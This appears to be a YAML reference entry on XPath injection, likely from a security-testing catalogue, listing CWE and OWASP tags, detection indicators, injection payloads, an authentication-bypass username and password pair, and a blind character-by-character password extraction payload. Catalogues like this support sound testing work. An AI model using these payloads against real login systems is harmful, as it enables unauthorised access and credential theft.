id: XPATH
name: XPath Injection
cwe:
- CWE-643
owasp: A03:2021 Injection
severity_range: High
description: Inject XPath syntax to bypass auth or extract data from XML data stores.
detection:
  indicators:
  - Login forms backed by XML user store
  - XML configuration query features
  payloads:
  - ''' or ''1''=''1'
  - ''' or 1=1 or ''a''=''a'
  - x' or name()='username' or 'x'='y
  - '''] | //user[name()=''admin'
  - 1 or count(/*)=1
exploitation:
  auth_bypass: username=admin' or '1'='1 password=' or '1'='1
  blind_extraction:
  - 1] | //user[name()='admin' and starts-with(password,'a')] | //a[1='
  - Extract char by char using starts-with()
tools:
- XCat
- Burp
references:
- https://owasp.org/www-community/attacks/XPATH_Injection
